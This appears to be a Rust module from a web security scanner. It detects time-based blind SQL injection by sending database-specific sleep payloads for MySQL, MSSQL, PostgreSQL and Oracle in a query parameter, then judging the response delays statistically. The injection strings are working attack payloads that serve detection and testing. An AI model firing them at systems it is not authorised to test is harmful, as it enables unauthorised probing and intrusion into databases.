//! Time-based (Blind) SQL Injection Detection
//!
//! Detects SQLi by injecting SLEEP payloads and measuring response time statistically.

use crate::http::client::HttpClient;
use crate::http::request::HttpRequest;
use crate::sqli::{DatabaseType, SqliResult, SqliTechnique};
use reqwest::Method;
use url::Url;

/// Latency profile with statistical data
#[derive(Debug, Clone)]
pub struct LatencyProfile {
    pub samples: Vec<u128>,
    pub mean: f64,
    pub variance: f64,
    pub std_dev: f64,
}

/// Time-based SQLi detection result
#[derive(Debug)]
pub struct TimeDetectionResult {
    pub injectable: bool,
    pub confidence: f32,
    pub baseline: LatencyProfile,
    pub injected: LatencyProfile,
    pub signal_ratio: f64,
    pub db_type: Option<DatabaseType>,
}

/// Time-based payloads for different databases
pub struct TimePayloads;

impl TimePayloads {
    /// MySQL SLEEP payload
    pub fn mysql(delay: u64) -> String {
        format!("' OR (SELECT 1 FROM (SELECT SLEEP({}))a)-- ", delay)
    }

    /// MSSQL WAITFOR payload
    pub fn mssql(delay: u64) -> String {
        format!("'; WAITFOR DELAY '0:0:{}'-- ", delay)
    }

    /// PostgreSQL pg_sleep payload
    pub fn postgresql(delay: u64) -> String {
        format!("'; SELECT pg_sleep({})-- ", delay)
    }

    /// Oracle DBMS_LOCK.SLEEP payload
    pub fn oracle(delay: u64) -> String {
        format!("' AND DBMS_LOCK.SLEEP({})-- ", delay)
    }

    /// Get all DB-specific payloads
    pub fn all(delay: u64) -> Vec<(String, DatabaseType)> {
        vec![
            (Self::mysql(delay), DatabaseType::MySQL),
            (Self::mssql(delay), DatabaseType::MSSQL),
            (Self::postgresql(delay), DatabaseType::PostgreSQL),
            (Self::oracle(delay), DatabaseType::Oracle),
        ]
    }
}

/// Detect time-based SQL injection
pub async fn detect(
    client: &HttpClient,
    base_url: &Url,
    param: &str,
    samples: usize,
    delay_seconds: u64,
) -> anyhow::Result<Option<SqliResult>> {
    // Step 1: Measure baseline latency
    let baseline = measure_baseline(client, base_url, samples).await?;

    tracing::debug!(
        "Baseline latency: mean={:.1}ms stddev={:.1}ms",
        baseline.mean,
        baseline.std_dev
    );

    // Step 2: Try each DB-specific payload
    for (payload, db_type) in TimePayloads::all(delay_seconds) {
        let injected = measure_injected(client, base_url, param, &payload, samples).await?;

        tracing::debug!(
            "[{}] Injected latency: mean={:.1}ms stddev={:.1}ms",
            db_type,
            injected.mean,
            injected.std_dev
        );

        // Step 3: Statistical decision
        let result = decide(baseline.clone(), injected, delay_seconds, db_type);

        if result.injectable {
            return Ok(Some(SqliResult {
                endpoint: base_url.to_string(),
                parameter: param.to_string(),
                technique: SqliTechnique::TimeBased,
                confidence: result.confidence,
                db_type: result.db_type,
                details: format!(
                    "Time-based SQLi detected. Baseline: {:.0}ms, Injected: {:.0}ms, Signal ratio: {:.2}",
                    result.baseline.mean,
                    result.injected.mean,
                    result.signal_ratio
                ),
            }));
        }
    }

    Ok(None)
}

/// Measure baseline latency (no injection)
pub async fn measure_baseline(
    client: &HttpClient,
    url: &Url,
    samples: usize,
) -> anyhow::Result<LatencyProfile> {
    let mut latencies = Vec::with_capacity(samples);

    for _ in 0..samples {
        let req = HttpRequest::new(Method::GET, url.clone());
        let resp = client.execute(req).await?;
        latencies.push(resp.elapsed_ms);
    }

    Ok(build_profile(latencies))
}

/// Measure latency with injected payload
pub async fn measure_injected(
    client: &HttpClient,
    base_url: &Url,
    param: &str,
    payload: &str,
    samples: usize,
) -> anyhow::Result<LatencyProfile> {
    let mut latencies = Vec::with_capacity(samples);

    for _ in 0..samples {
        let mut url = base_url.clone();
        url.query_pairs_mut().append_pair(param, payload);

        let req = HttpRequest::new(Method::GET, url);
        let resp = client.execute(req).await?;
        latencies.push(resp.elapsed_ms);
    }

    Ok(build_profile(latencies))
}

/// Make statistical decision about time-based SQLi
pub fn decide(
    baseline: LatencyProfile,
    injected: LatencyProfile,
    expected_delay_sec: u64,
    db_type: DatabaseType,
) -> TimeDetectionResult {
    let expected_delay_ms = (expected_delay_sec * 1000) as f64;
    let delta = injected.mean - baseline.mean;

    // Combined noise from both samples
    let noise = (baseline.variance + injected.variance).sqrt();

    // Signal-to-noise ratio
    let signal_ratio = if noise > 0.0 { delta / noise } else { 0.0 };

    // Check if delay is close to expected
    let delay_accuracy = (delta - expected_delay_ms).abs() / expected_delay_ms;
    let delay_matches = delay_accuracy < 0.5; // Within 50% of expected delay

    // Classification
    let (injectable, confidence) = classify_time_sqli(signal_ratio, delay_matches);

    TimeDetectionResult {
        injectable,
        confidence,
        baseline,
        injected,
        signal_ratio,
        db_type: if injectable { Some(db_type) } else { None },
    }
}

/// Classify time-based SQLi with explainable thresholds
fn classify_time_sqli(signal_ratio: f64, delay_matches: bool) -> (bool, f32) {
    if signal_ratio >= 3.0 && delay_matches {
        (true, 0.95) // Very high confidence
    } else if signal_ratio >= 3.0 {
        (true, 0.85) // High confidence, delay might be off
    } else if signal_ratio >= 2.0 && delay_matches {
        (true, 0.80) // Good confidence
    } else if signal_ratio >= 2.0 {
        (true, 0.70) // Moderate confidence
    } else if signal_ratio >= 1.5 && delay_matches {
        (true, 0.60) // Lower confidence, needs verification
    } else {
        (false, 0.0) // Not injectable
    }
}

/// Build latency profile with statistics
fn build_profile(samples: Vec<u128>) -> LatencyProfile {
    let mean = calculate_mean(&samples);
    let variance = calculate_variance(&samples, mean);
    let std_dev = variance.sqrt();

    LatencyProfile {
        samples,
        mean,
        variance,
        std_dev,
    }
}

fn calculate_mean(samples: &[u128]) -> f64 {
    if samples.is_empty() {
        return 0.0;
    }
    let sum: u128 = samples.iter().sum();
    sum as f64 / samples.len() as f64
}

fn calculate_variance(samples: &[u128], mean: f64) -> f64 {
    if samples.is_empty() {
        return 0.0;
    }
    samples
        .iter()
        .map(|&x| {
            let diff = x as f64 - mean;
            diff * diff
        })
        .sum::<f64>()
        / samples.len() as f64
}

